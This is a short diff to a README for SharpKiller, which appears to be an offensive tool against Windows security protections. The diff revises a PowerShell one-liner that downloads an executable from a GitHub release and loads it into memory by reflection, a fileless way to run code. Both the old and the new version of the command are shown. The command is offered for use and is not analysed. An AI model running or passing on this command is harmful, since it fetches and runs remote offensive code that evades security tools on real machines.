@@ -72,7 +72,7 @@ Newly integrated features:
 
 ## OneLiner to run with reflection
 ```
-$url = "https://github.com/S1lkys/SharpKiller/releases/download/1.1/Sharp-Killer.exe"; $sk=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));$vars = New-Object System.Collections.Generic.List[System.Object];$BindingFlags= [Reflection.BindingFlags] "NonPublic,Static";$sk.EntryPoint.Invoke($null,@(,$passed));
+$url = "https://github.com/S1lkys/SharpKiller/releases/download/1.1/Sharp-Killer.exe"; $cli = New-Object System.Net.WebClient; $sk=[System.Reflection.Assembly]::Load([byte[]]( $cli.DownloadData($url)));$vars = New-Object System.Collections.Generic.List[System.Object];$BindingFlags= [Reflection.BindingFlags] "NonPublic,Static";$sk.EntryPoint.Invoke($null,@(,$passed));
 ```
 
 ## References:
